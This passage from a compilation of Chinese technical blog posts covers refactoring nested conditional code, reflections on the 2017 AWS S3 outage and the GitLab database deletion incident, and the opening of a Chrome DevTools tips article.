        symbol->typeInfo = CopyTypeInfo(method->GetReturn());
        return false;
    }
    return true;
}

void ExpressionResolvings(auto &manager, auto &argument, auto &symbol) 
{
    int index = manager->expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index == -1) return;
    
    auto type = manager->expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj())) return;

    types.Add(type.Obj());
    auto group = type->GetTypeDescriptor()->GetMethodGroupByName(L"CastResult", true);
    if  ( ! group ) return;

    int count = group->GetMethodCount();
    for (int i = 0; i < count; i++) { auto method = group->GetMethod(i);
        if ( ! CopyMethodTypeInfo(method, group, symbol) ) break;
    }
}

...
...
FOREACH(Ptr<WfExpression>, argument, node->arguments) {
    ExpressionResolvings(manager, arguments, symbol)
}
...
...
```

你发出现，抽成函数后，代码比之前变得更容易读和更容易维护了。不是吗？

有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护。这才是函数的作用。

#### 嵌套的 if 外的代码

微博上还有人问，原来的代码如果在各个 if 语句后还有要执行的代码，那么应该如何重构。比如下面这样的代码。

```
//原版
for(....) {
    do_before_cond1()
    if (cond1) {
        do_before_cond2();
        if (cond2) {
            do_before_cond3();
            if (cond3) {
                do_something();
            }
            do_after_cond3();
        }
        do_after_cond2();
    }
    do_after_cond1();
}
```

上面这段代码中的那些 `do_after_condX()` 是无论条件成功与否都要执行的。所以，我们拉平后的代码如下所示：

```
//重构第一版
for(....) {
    do_before_cond1();
    if ( !cond1 ) {
        do_after_cond1();
        continue
    } 
    do_after_cond1();

    do_before_cond2();
    if ( !cond2 ) { 
        do_after_cond2();
        continue;
    }
    do_after_cond2();

    do_before_cond3();
    if ( !cond3 ) {
        do_after_cond3();
        continue;
    }
    do_after_cond3();

    do_something();  
}
```

你会发现，上面的 `do_after_condX` 出现了两份。**如果 if 语句块中的代码改变了某些`do_after_condX`依赖的状态，那么这是最终版本。**

但是，如果它们之前没有依赖关系的话，根据 DRY 原则，我们就可以只保留一份，那么直接掉到 if 条件前就好了，如下所示：

```
//重构第二版
for(....) {
    do_before_cond1();
    do_after_cond1();
    if ( !cond1 ) continue;
 
    do_before_cond2();
    do_after_cond2();
    if ( !cond2 ) continue;

    do_before_cond3();
    do_after_cond3();
    if ( !cond3 ) continue;

    do_something();  
}
```

此时，你会说，我靠，居然，改变了执行的顺序，把条件放到 `do_after_condX()` 后面去了。这会不会有问题啊？

其实，你再分析一下之前的代码，你会发现，本来，cond1 是判断 do_before_cond1() 是否出错的，如果有成功了，才会往下执行。而 do_after_cond1() 是无论如何都要执行的。从逻辑上来说，do_after_cond1()其实和do_before_cond1()的执行结果无关，而 cond1 却和是否去执行 do_before_cond2() 相关了。如果我把断行变成下面这样，反而代码逻辑更清楚了。

```
//重构第三版
for(....) {

    do_before_cond1();
    do_after_cond1();


    if ( !cond1 ) continue;  // <-- cond1 成了是否做第二个语句块的条件
    do_before_cond2();
    do_after_cond2();

    if ( !cond2 ) continue; // <-- cond2 成了是否做第三个语句块的条件
    do_before_cond3();
    do_after_cond3();

    if ( !cond3 ) continue; //<-- cond3 成了是否做第四个语句块的条件
    do_something(); 
 
}
```

于是乎，在未来维护代码的时候，维护人一眼看上去就明白，代码在什么时候会执行到哪里。 这个时候，你会发现，把这些语句块抽成函数，代码会干净的更多，再重构一版：

```
//重构第四版
bool do_func3() {
   do_before_cond2();
   do_after_cond2();
   return cond3;
}

bool do_func2() {
   do_before_cond2();
   do_after_cond2();
   return cond2;
}

bool do_func1() {
   do_before_cond1();
   do_after_cond1();
   return cond1;
}

// for-loop 你可以重构成这样
for (...) {
    bool cond = do_func1();
    if (cond) cond = do_func2();
    if (cond) cond = do_func3();
    if (cond) do_something();
}

// for-loop 也可以重构成这样
for (...) {
    if ( ! do_func1() ) continue;
    if ( ! do_func2() ) continue;
    if ( ! do_func3() ) continue;
    do_something();
}
```

上面，我给出了两个版本的for-loop，你喜欢哪个？我喜欢第二个。这个时候，因为for-loop里的代码非常简单，就算你不喜欢 continue ，这样的代码阅读成本已经很低了。

#### 状态检查嵌套

接下来，我们再来看另一个示例。下面的代码的伪造了一个场景——把两个人拉到一个一对一的聊天室中，因为要检查双方的状态，所以，代码可能会写成了“箭头型”。

```
int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
{
    if ( pA->isConnected() ) {
        manager->Prepare(pA);
        if ( pB->isConnected() ) {
            manager->Prepare(pB);
            if ( manager->ConnectTogther(pA, pB) ) {
                pA->Write("connected");
                pB->Write("connected");
                return S_OK;
            }else{
                return S_ERROR;
            }

        }else {
            pA->Write("Peer is not Ready, waiting...");
            return S_RETRY;
        }
    }else{
        if ( pB->isConnected() ) {
            manager->Prepare();
            pB->Write("Peer is not Ready, waiting...");
            return S_RETRY;
        }else{
            pA->Close();
            pB->Close();
            return S_ERROR;
        }
    }
    //Shouldn't be here!
    return S_ERROR;
}
```

重构上面的代码，我们可以先分析一下上面的代码，说明了，上面的代码就是对 PeerA 和 PeerB 的两个状态 “连上”， “未连上” 做组合 “状态” （注：实际中的状态应该比这个还要复杂，可能还会有“断开”、“错误”……等等状态）， 于是，我们可以把代码写成下面这样，合并上面的嵌套条件，对于每一种组合都做出判断。这样一来，逻辑就会非常的干净和清楚。

```
int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
{
    if ( pA->isConnected() ) {
        manager->Prepare(pA);
    }

    if ( pB->isConnected() ) {
        manager->Prepare(pB);
    }

    // pA = YES && pB = NO
    if (pA->isConnected() && ! pB->isConnected()  ) {
        pA->Write("Peer is not Ready, waiting");
        return S_RETRY;
    // pA = NO && pB = YES
    }else if ( !pA->isConnected() && pB->isConnected() ) {
        pB->Write("Peer is not Ready, waiting");
        return S_RETRY;
    // pA = YES && pB = YES
    }else if (pA->isConnected() && pB->isConnected()  ) {
        if ( ! manager->ConnectTogther(pA, pB) ) {
            return S_ERROR;
        }
        pA->Write("connected");
        pB->Write("connected");
        return S_OK;
    }

    // pA = NO, pB = NO
    pA->Close();
    pB->Close();
    return S_ERROR;
}
```

#### 延伸思考

对于 `if-else` 语句来说，一般来说，就是检查两件事：**错误** 和 **状态**。

##### 检查错误

对于检查错误来说，使用 Guard Clauses 会是一种标准解，但我们还需要注意下面几件事：

1）当然，出现错误的时候，还会出现需要释放资源的情况。你可以使用 `goto fail;` 这样的方式，但是最优雅的方式应该是C++面向对象式的 RAII 方式。

2）以错误码返回是一种比较简单的方式，这种方式有很一些问题，比如，如果错误码太多，判断出错的代码会非常复杂，另外，正常的代码和错误的代码会混在一起，影响可读性。所以，在更为高组的语言中，使用 `try-catch` 异常捕捉的方式，会让代码更为易读一些。

##### 检查状态

对于检查状态来说，实际中一定有更为复杂的情况，比如下面几种情况：

1）像TCP协议中的两端的状态变化。

2）像shell各个命令的命令选项的各种组合。

3）像游戏中的状态变化（一棵非常复杂的状态树）。

4）像语法分析那样的状态变化。

对于这些复杂的状态变化，其本上来说，你需要先定义一个状态机，或是一个子状态的组合状态的查询表，或是一个状态查询分析树。

**写代码时，代码的运行中的控制状态或业务状态是会让你的代码流程变得混乱的一个重要原因，重构“箭头型”代码的一个很重要的工作就是重新梳理和描述这些状态的变迁关系**。

#### 总结

好了，下面总结一下，把“箭头型”代码重构掉的几个手段如下：

1）**使用 Guard Clauses** 。 尽可能的让出错的先返回， 这样后面就会得到干净的代码。

2）**把条件中的语句块抽取成函数**。 有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护，**写出让人易读易维护的代码才是重构代码的初衷**！

3）**对于出错处理，使用try-catch异常处理和[RAII机制](https://stackoverflow.com/questions/2321511/what-is-meant-by-resource-acquisition-is-initialization-raii)**。返回码的出错处理有很多问题，比如：A) 返回码可以被忽略，B) 出错处理的代码和正常处理的代码混在一起，C) 造成函数接口污染，比如像atoi()这种错误码和返回值共用的糟糕的函数。

4）**对于多个状态的判断和组合，如果复杂了，可以使用“组合状态表”，或是状态机加Observer的状态订阅的设计模式**。这样的代码即解了耦，也干净简单，同样有很强的扩展性。

5） **重构“箭头型”代码其实是在帮你重新梳理所有的代码和逻辑，这个过程非常值得为之付出**。重新整思路去想尽一切办法简化代码的过程本身就可以让人成长。

（全文完）

# AWS 的 S3 故障回顾和思考

#####  [2017年03月03日 ](https://coolshell.cn/articles/17737.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [56 条评论](https://coolshell.cn/articles/17737.html#comments) 64,592 人阅读

![img](photo/Amazon-Web-Services-Down.png)继[Gitlab的误删除数据事件](https://coolshell.cn/articles/17680.html)没几天，“不沉航母” AWS S3 （Simple Storage Service）几天前也“沉”了4个小时，墙外的半个互联网也跟着挂了。如约，按 AWS 惯例，AWS今天给出了一个简单的故障报告《[Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region](https://aws.amazon.com/cn/message/41926/)》。这个故障和简单来说和Gitlab一样，也是人员误操作。先简单的说一下这份报中说了什么。

#### 故障原因

简单来说，这天，有一个 AWS 工程师在调查 Northern Virginia (US-EAST-1) Region 上 S3 的一个和账务系统相关的问题，这个问题是S3的账务系统变慢了（我估计这个故障在Amazon里可能是Sev2级，Sev2级的故障在Amazon算是比较大的故障，需要很快解决），Oncall的开发工程师（注：Amazon的运维都是由开发工程师来干的，所以Amazon内部嬉称SDE-Software Developer Engineer 为 Someone Do Everything）想移除一个账务系统里的一个子系统下的一些少量的服务器（估计这些服务器上有问题，所以想移掉后重新部署），结果呢，有一条命令搞错了，导致了移除了大量的S3的控制系统。包括两个很重要的子系统：



1）**一个是S3的对象索引服务（Index）**，其中存储了S3对象的metadata和位置信息。这个服务也提供了所有的 GET，LIST，PUT 和DELETE请求。

2）**一个是S3的位置服务系统（Placement）**，这个服务提供对象的存储位置和索引服务的系统。这个系统主要是用于处理PUT新对象请求。

这就是为什么S3不可访问的原因。

在后面，AWS也说明了一下故障恢复的过程，其中重点提到了这点——

虽然整个S3的是做过充分的故障设计的（注：AWS的七大Design Principle 之一 Design for Failure）—— 就算是最核心的组件或服务出问题了，系统也能恢复。但是，可能是在过去的日子里 S3 太稳定了，所以，AWS 在很长很长一段时间内都没有重启过 S3 的核心服务，而过去这几年，S3 的数据对象存储级数级的成长（S3存了什么样数量级的对象，因为在Amazon工作过，所以多大概知道是个什么数量级，这里不能说，不过，老实说，很惊人的），所以，这两个核心服务在启动时要重建并校验对象索引元数据的完整性，这个过程没想到花了这么长的时候。而Placement服务系统依赖于Index 服务，所以花了更长的时间。

了解过系统底层的技术人员应该都知道这两个服务有多重要，简而言之，这两个系统就像是Unix/Linux文件系统中的inode，或是像HDFS里的node name，如果这些元数据丢失，那么，用户的所有数据基本上来说就等于全丢了。

而要恢复索引系统，就像你的操作系统从异常关机后启动，文件系统要做系统自检那样，硬盘越大，文件越多，这个过程就越慢。

另外，这次，AWS没有使用像以前那样 Outage 的故障名称，用的是 “Increased Error Rate” 这样的东西。我估计是没有把所有这两个服务删除完，估计有些用户是可以用的，有的用户是则不行了。

#### 后续改进

在这篇故障简报中，AWS 也提到了下面的这些改进措施——

1）**改进运维操作工具**。对于此次故障的运维工具，有下面改进：

- **让删除服务这个操作变慢一些**（陈皓注：这样错了也可以有时间反悔，相对于一个大规模的分布式系统，这招还是很不错的，至少在系统报警时有也可以挽救）

- **加上一个最小资源数限制的SafeGuard**（陈皓注：就是说，任何服务在运行时都应该有一个最小资源数，分布式集群控制系统会强行维护服务正常运行的最小的一个资源数）

- 举一反三，Review所有和其它的运维工具，保证他们也相关的检查。

2）**改进恢复过程。**对于恢复时间过长的问题，有如下改进：

- **分解现有厚重的重要服务成更小的单元**（在 AWS，Service是大服务，小服务被称之为 Cell），AWS 会把这几个重要的服务重构成 Cell服务。（陈皓注：这应该就是所谓的“微服务”了吧）。这样，服务粒度变小，重启也会快一些，而且还可以减少故障面（原文：blast radius – 爆炸半径）

- **今年内完成对 Index 索引服务的分区计划**。

 

#### 相关思考

下面是我对这一故障的相关思考——

0）**太喜欢像Gitlab和AWS这样的故障公开了**，那怕是一个自己人为的低级错误。不掩盖，不文过饰非，透明且诚恳。Cool!

1）这次事件，还好没有丢失这么重要的数据，不然的话，将是灾难性的。

2）另外，面对在 US-EASE-1 这个老牌 Region 上的海量的对象，而且能在几个小时内恢复，很不容易了。

3）这个事件，再次映证了我在《[关于高可用的系统](https://coolshell.cn/articles/17459.html)》中提到的观点：**一个系统的高可用的因素很多，不仅仅只是系统架构，更重要的是——高可用运维**。

4）**对于高可用的运维，平时的故障演习是很重要的。**AWS 平时应该没有相应的故障演习，所以导致要么长期不出故障，一出就出个大的让你措手不及。这点，Facebook就好一些，他们每个季度扔个骰子，随机关掉一个IDC一天。Netflix 也有相关的 Chaos Monkey，我以前在的路透每年也会做一次大规模的故障演练——灾难演习。

5）AWS对于后续的改进可以看出他的技术范儿。可以看到其改进方案是用技术让自己的系统更为的高可用。然后，对比国内的公司对于这样的故障，基本上会是下面这样的画风：

a）加上更多更为严格的变更和审批流程，

b）使用限制更多的权限系统和审批系统

c）使用更多的人来干活（一个人干事，另一个人在旁边看）

d）使用更为厚重的测试和发布过程

e）惩罚故障人，用价值观教育工程师。

这还是我老生长谈的那句话——**如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题**。（注意：这里我并没有隔离技术和管理，只是更为倾向于用技术解决问题）

**最后，你是要建一个 “高可用的技术系统” ，还是一个 “高用的管理系统”？ ;-)**

（全文完）

# 从GITLAB误删除数据库想到的

#####  [2017年02月02日 ](https://coolshell.cn/articles/17680.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [67 条评论](https://coolshell.cn/articles/17680.html#comments) 111,016 人阅读

![img](photo/gitlab-600.jpg)昨天，Gitlab.com发生了一个大事，某同学误删了数据库，这个事看似是个低级错误，不过，因为Gitlab把整个过程的细节都全部暴露出来了，所以，可以看到很多东西，而对于类似这样的事情，我自己以前也干过，而在最近的两公司中我也见过（Amazon中见过一次，阿里中见过至少四次），正好通过这个事来说说一下自己的一些感想和观点吧。**我先放个观点：你觉得有备份系统就不会丢数据了吗？**

目录



[事件回顾](https://coolshell.cn/articles/17680.html#事件回顾)[相关的思考](https://coolshell.cn/articles/17680.html#相关的思考)[技术方面](https://coolshell.cn/articles/17680.html#技术方面)[关于备份](https://coolshell.cn/articles/17680.html#关于备份)[非技术方面](https://coolshell.cn/articles/17680.html#非技术方面)

#### 事件回顾

整个事件的回顾Gitlab.com在第一时间就放到了[Google Doc上](https://docs.google.com/document/d/1GCK53YDcBWQveod9kfzW-VCxIABGiryG7_z_6jHdVik/pub)，事后，又发了[一篇Blog](https://about.gitlab.com/2017/02/01/gitlab-dot-com-database-incident/)来说明这个事，在这里，我简单的回顾一下这个事件的过程。

首先，一个叫YP的同学在给gitlab的线上数据库做一些负载均衡的工作，在做这个工作时的时候突发了一个情况，Gitlab被DDoS攻击，数据库的使用飙高，在block完攻击者的IP后，发现有个staging的数据库(db2.staging)已经落后生产库4GB的数据，于是YP同学在Fix这个staging库的同步问题的时候，发现db2.staging有各种问题都和主库无法同步，在这个时候，YP同学已经工作的很晚了，在尝试过多个方法后，发现db2.staging都hang在那里，无法同步，于是他想把db2.staging的数据库删除了，这样全新启动一个新的复制，结果呢，删除数据库的命令错误的敲在了生产环境上（db1.cluster），结果导致整个生产数据库被误删除。（**陈皓注：这个失败基本上就是 “工作时间过长” + “在多数终端窗口中切换中迷失掉了”**）



在恢复的过程中，他们发现只有db1.staging的数据库可以用于恢复，而其它的5种备份机制都不可用，第一个是数据库的同步，没有同步webhook，第二个是对硬盘的快照，没有对数据库做，第三个是用pg_dump的备份，发现版本不对（用9.2的版本去dump 9.6的数据）导致没有dump出数据，第四个S3的备份，完全没有备份上，第五个是相关的备份流程是问题百出的，只有几个粗糙的人肉的脚本和糟糕的文档，也就是说，不但是是人肉的，而且还是完全不可执行的。（**陈皓注：就算是这些备份机制都work，其实也有问题，因为这些备份大多数基本上都是24小时干一次，所以，要从这些备份恢复也一定是是要丢数据的了，只有第一个数据库同步才会实时一些**）

最终，gitlab从db1.staging上把6个小时前的数据copy回来，结果发现速度非常的慢，备份结点只有60Mbits/S，拷了很长时间（**陈皓注：为什么不把db1.staging给直接变成生产机？因为那台机器的性能很差**）。数据现在的恢复了，不过，因为恢复的数据是6小时前的，所以，有如下的数据丢失掉了：

- 粗略估计，有4613 的项目， 74 forks,  和 350 imports 丢失了；但是，因为Git仓库还在，所以，可以从Git仓库反向推导数据库中的数据，但是，项目中的issues等就完全丢失了。
- 大约有±4979 提交记录丢失了（陈皓注：估计也可以用git仓库中反向恢复）。
- 可能有 707  用户丢失了，这个数据来自Kibana的日志。
- 在1月31日17:20 后的Webhooks 丢失了。

因为Gitlab把整个事件的细节公开了出来，所以，也得到了很多外部的帮助，2nd Quadrant的CTO – [Simon Riggs](https://www.linkedin.com/in/simonat2ndquadrantdotcom) 在他的blog上也发布文章 [Dataloss at Gitlab ](http://blog.2ndquadrant.com/dataloss-at-gitlab/)给了一些非常不错的建议：

- 关于PostgreSQL 9.6的数据同步hang住的问题，可能有一些Bug，正在fix中。
- PostgreSQL有4GB的同步滞后是正常的，这不是什么问题。
- 正常的停止从结点，会让主结点自动释放WALSender的链接数，所以，不应该重新配置主结点的 max_wal_senders 参数。但是，停止从结点时，主结点的复数连接数不会很快的被释放，而新启动的从结点又会消耗更多的链接数。他认为，Gitlab配置的32个链接数太高了，通常来说，2到4个就足够了。
- 另外，之前gitlab配置的max_connections=8000太高了，现在降到2000个是合理的。
- pg_basebackup 会先在主结点上建一个checkpoint，然后再开始同步，这个过程大约需要4分钟。
- 手动的删除数据库目录是非常危险的操作，这个事应该交给程序来做。推荐使用刚release 的 [repmgr](https://www.2ndquadrant.com/en/resources/repmgr/)
- 恢复备份也是非常重要的，所以，也应该用相应的程序来做。推荐使用 [barman](https://www.2ndquadrant.com/en/resources/barman/) （其支持S3）
- 测试备份和恢复是一个很重要的过程。

看这个样子，估计也有一定的原因是——Gitlab的同学对PostgreSQL不是很熟悉。

随后，Gitlab在其网站上也开了一系列的issues，其issues列表在这里 [Write post-mortem](https://gitlab.com/gitlab-com/www-gitlab-com/issues/1108) (这个列表可能还会在不断更新中)

- [infrastructure#1094](https://gitlab.com/gitlab-com/infrastructure/issues/1094) – Update PS1 across all hosts to more clearly differentiate between hosts and environments
- [infrastructure#1095](https://gitlab.com/gitlab-com/infrastructure/issues/1095) – Prometheus monitoring for backups
- [infrastructure#1096](https://gitlab.com/gitlab-com/infrastructure/issues/1096) – Set PostgreSQL’s max_connections to a sane value
- [infrastructure#1097](https://gitlab.com/gitlab-com/infrastructure/issues/1097) – Investigate Point in time recovery & continuous archiving for PostgreSQL
- [infrastructure#1098](https://gitlab.com/gitlab-com/infrastructure/issues/1098) – Hourly LVM snapshots of the production databases
- [infrastructure#1099](https://gitlab.com/gitlab-com/infrastructure/issues/1099) – Azure disk snapshots of production databases
- [infrastructure#1100](https://gitlab.com/gitlab-com/infrastructure/issues/1100) – Move staging to the ARM environment
- [infrastructure#1101](https://gitlab.com/gitlab-com/infrastructure/issues/1101) – Recover production replica(s)
- [infrastructure#1102](https://gitlab.com/gitlab-com/infrastructure/issues/1102) – Automated testing of recovering PostgreSQL database backups
- [infrastructure#1103](https://gitlab.com/gitlab-com/infrastructure/issues/1103) – Improve PostgreSQL replication documentation/runbooks
- [infrastructure#1104](https://gitlab.com/gitlab-com/infrastructure/issues/1104) – Kick out SSH users inactive for N minutes
- [infrastructure#1105](https://gitlab.com/gitlab-com/infrastructure/issues/1105) – Investigate pgbarman for creating PostgreSQL backups

从上面的这个列表中，我们可以看到一些改进措施了。挺好的，不过我觉得还不是很够。

#### 相关的思考

因为类似这样的事，我以前也干过（误删除过数据库，在多个终端窗口中迷失掉了自己所操作的机器……），而且我在amazon里也见过一次，在阿里内至少见过四次以上（在阿里人肉运维的误操作的事故是我见过最多的），但是我无法在这里公开分享，私下可以分享。在这里，我只想从非技术和技术两个方面分享一下我的经验和认识。

##### 技术方面

**人肉运维**

一直以来，我都觉得直接到生产线上敲命令是一种非常不好的习惯。我认为，**一个公司的运维能力的强弱和你上线上环境敲命令是有关的，你越是喜欢上线敲命令你的运维能力就越弱，越是通过自动化来处理问题，你的运维能力就越强**。理由如下：

其一，如果说对代码的改动都是一次发布的话，那么，对生产环境的任何改动（包括硬件、操作系统、网络、软件配置……），也都算是一次发布。那么这样的发布就应该走发布系统和发布流程，要被很好的测试、上线和回滚计划。关键是，走发布过程是可以被记录、追踪和回溯的，而在线上敲命令是完全无法追踪的。没人知道你敲了什么命令。

其二，真正良性的运维能力是——人管代码，代码管机器，而不是人管机器。你敲了什么命令没人知道，但是你写个工具做变更线上系统，这个工具干了什么事，看看工具的源码就知道了。

另外、有人说，以后不要用rm了，要用mv，还有人说，以后干这样的事时，一个人干，另一个人在旁边看，还有人说，要有一个checklist的强制流程做线上的变更，还有人说要增加一个权限系统。我觉得，这些虽然可以work，但是依然不好，再由如下：

其一、如果要解决一个事情需要加更多的人来做的事，那这事就做成劳动密集型了。今天我们的科技就是在努力消除人力成本，而不是在增加人力成本。而做为一个技术人员，解决问题的最好方式是努力使用技术手段，而不是使用更多的人肉手段。**人类区别于动物的差别就是会发明和使用现代化的工具，而不是使用更多的人力**。另外，**这不仅仅因为是，人都是会有这样或那样的问题（疲惫、情绪化、急燥、冲动……），而机器是单一无脑不知疲惫的，更是因为，机器干活的效率和速度是比人肉高出N多倍的**。

其二、增加一个权限系统或是别的一个watch dog的系统完全是在开倒车，权限系统中的权限谁来维护和审批？不仅仅是因为多出来的系统需要多出来的维护，关键是这个事就没有把问题解决在root上。除了为社会解决就业问题，别无好处，故障依然会发生，有权限的人一样会误操作。对于Gitlab这个问题，正如2nd Quadrant的CTO建议的那样，你需要的是一个自动化的备份和恢复的工具，而不是一个权限系统。

其三、像使用mv而不rm，搞一个checklist和一个更重的流程，更糟糕。这里的逻辑很简单，因为，1）这些规则需要人去学习和记忆，本质上来说，你本来就不相信人，所以你搞出了一些规则和流程，而这些规则和流程的执行，又依赖于人，换汤不换药，2）另外，**写在纸面上的东西都是不可执行的，可以执行的就是只有程序，所以，为什么不把checklist和流程写成代码呢**？（你可能会说程序也会犯错，是的，程序的错误是consistent，而人的错误是inconsistent）

最关键的是，**数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些想流程、规则、人肉检查、权限系统、checklist等等统统都不管用了，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。**

#### 关于备份

一个系统是需要做数据备份的，但是，你会发现，**Gitlab这个事中，就算所有的备份都可用，也不可避免地会有数据的丢失，或是也会有很多问题**。理由如下：

1）备份通常来说都是周期性的，所以，如果你的数据丢失了，从你最近的备份恢复数据里，从备份时间到故障时间的数据都丢失了。

2）备份的数据会有版本不兼容的问题。比如，在你上次备份数据到故障期间，你对数据的scheme做了一次改动，或是你对数据做了一些调整，那么，你备份的数据就会和你线上的程序出现不兼容的情况。

3）有一些公司或是银行有灾备的数据中心，但是灾备的数据中心没有一天live过。等真正灾难来临需要live的时候，你就会发现，各种问题让你live不起来。你可以读一读几年前的这篇报道好好感受一下《[以史为鉴 宁夏银行7月系统瘫痪最新解析](http://finance.sina.com.cn/money/bank/20140804/091219903553.shtml)》

所以，在灾难来临的时候，你会发现你所设计精良的“备份系统”或是“灾备系统”就算是平时可以工作，但也会导致数据丢失，而且可能长期不用的备份系统很难恢复（比如应用、工具、数据的版本不兼容等问题）。

我之前写过一篇《[分布式系统的事务处理](https://coolshell.cn/articles/10910.html)》，你还记得下面这张图吗？看看 Data Loss 那一行的，在Backups, Master/Slave 和 Master/Master的架构下，都是会丢的。

![img](photo/Transaction-Across-DataCenter.jpg)

所以说，**如果你要让你的备份系统随时都可以用，那么你就要让它随时都Live着**，而随时都Live着的多结点系统，基本上就是一个分布式的高可用的系统。因为**，数据丢失的原因有很多种，比如掉电、磁盘损坏、中病毒等等，而那些流程、规则、人肉检查、权限系统、checklist等等都只是让人不要误操作，都不管用，这个时候，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事，得再说一篇）**

另外，你可以参看我的另一篇《[关于高可用系统](https://coolshell.cn/articles/17459.html)》，这篇文章中以MySQL为例，数据库的replication也只能达到 两个9。

**AWS 的 S3 的的高可用是4个加11个9的持久性（**所谓11个9的持久性durability，AWS是这样定义的，如果你存了1万个对象，那么丢一个的时间是1000万年**），这意味着，不仅仅只是硬盘坏，机器掉电，整个机房挂了，其保证可以承受有两个设施的数据丢失，数据还是可用的。试想，如果你把数据的可用性通过技术做到了这个份上，那么，你还怕被人误删一个结点上的数据吗？**

##### 非技术方面

**故障反思**

一般说来，故障都需要反思，在Amazon，S2以上的故障都需要写COE（Correction of Errors），其中一节就是需要Ask 5 Whys，我发现在Gitlab的故障回顾的blog中第一段中也有说要在今天写个Ask 5 Whys。关于Ask 5 Whys，其实并不是亚马逊的玩法，这还是算一个业内常用的玩法，也就是说不断的为自己为为什么，直到找到问题的概本原因，这会逼着所有的当事人去学习和深究很多东西。在Wikipedia上有相关的词条 [5 Whys](https://en.wikipedia.org/wiki/5_Whys)，其中罗列了14条规则：

1. 你需要找到正确的团队来完成这个故障反思。
2. 使用纸或白板而不是电脑。
3. 写下整个问题的过程，确保每个人都能看懂。
4. 区别原因和症状。
5. 特别注意因果关系。
6. 说明Root Cause以及相关的证据。
7. 5个为什么的答案需要是精确的。
8. 寻找问题根源的步骤，而不是直接跳到结论。
9. 要基础客观的事实、数据和知识。
10. 评估过程而不是人。
11. 千万不要把“人为失误”或是“工作不注意”当成问题的根源。
12. 培养信任和真诚的气氛和文化。
13. 不断的问“为什么”直到问题的根源被找到。这样可以保证同一个坑不会掉进去两次。
14. 当你给出“为什么”的答案时，你应该从用户的角度来回答。

**工程师文化**

上述的这些观点，其实，我在我的以住的博客中都讲过很多遍了，你可以参看《[什么是工程师文化？](https://coolshell.cn/articles/17497.html)》以及《[开发团队的效率](https://coolshell.cn/articles/11656.html)》。其实，说白了就是这么一个事——**如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题**。

这个道理很简单，**数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些流程、规则、人肉检查、权限系统、checklist等等统统都不管用，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事得说三遍）**

**事件公开**

很多公司基本上都是这样的套路，首先是极力掩盖，如果掩盖不了了就开始撒谎，撒不了谎了，就“文过饰非”、“避重就轻”、“转移视线”。然而，面对危机的最佳方法就是——“多一些真诚，少一些套路”，**所谓的“多一些真诚”的最佳实践就是——“透明公开所有的信息”**，Gitlab此次的这个事给大家树立了非常好的榜样。AWS也会把自己所有的故障和细节都批露出来。

**事情本来就做错了，而公开所有的细节，会让大众少很多猜测的空间，有利于抵制流言和黑公关，同时，还会赢得大众的理解和支持**。看看Gitlab这次还去YouTube上直播整个修复过程，是件很了不起的事，大家可以到他们的blog上看看，对于这样的透明和公开，一片好评。

（全文完）

# CHROME开发者工具的小技巧

#####  [2017年01月19日 ](https://coolshell.cn/articles/17634.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [63 条评论](https://coolshell.cn/articles/17634.html#comments) 95,854 人阅读

Chrome的开发者工具是个很强大的东西，相信程序员们都不会陌生，不过有些小功能可能并不为大众所知，所以，写下这篇文章罗列一下可能你所不知道的功能，有的功能可能会比较实用，有的则不一定，也欢迎大家补充交流。

话不多话，我们开始。

目录



[代码格式化](https://coolshell.cn/articles/17634.html#代码格式化)[强制DOM状态](https://coolshell.cn/articles/17634.html#强制DOM状态)[动画](https://coolshell.cn/articles/17634.html#动画)[直接编辑网页](https://coolshell.cn/articles/17634.html#直接编辑网页)[网络限速](https://coolshell.cn/articles/17634.html#网络限速)[复制HTTP请求](https://coolshell.cn/articles/17634.html#复制HTTP请求)[抓个带手机的图](https://coolshell.cn/articles/17634.html#抓个带手机的图)[设置断点](https://coolshell.cn/articles/17634.html#设置断点)[给DOM设置断点](https://coolshell.cn/articles/17634.html#给DOM设置断点)[给XHR和Event Lisener设置断点](https://coolshell.cn/articles/17634.html#给XHR和Event_Lisener设置断点)[关于Console中的技巧](https://coolshell.cn/articles/17634.html#关于Console中的技巧)[DOM操作](https://coolshell.cn/articles/17634.html#DOM操作)[Console中的一些函数](https://coolshell.cn/articles/17634.html#Console中的一些函数)[Console的输出](https://coolshell.cn/articles/17634.html#Console的输出)[关于console对象](https://coolshell.cn/articles/17634.html#关于console对象)[关于快捷键](https://coolshell.cn/articles/17634.html#关于快捷键)

#### 代码格式化

有很多css/js的代码都会被 minify 掉，你可以点击代码窗口左下角的那个 **`{ }`** 标签，chrome会帮你给格式化掉。

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMxOSIgd2lkdGg9IjcwNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)



#### 强制DOM状态

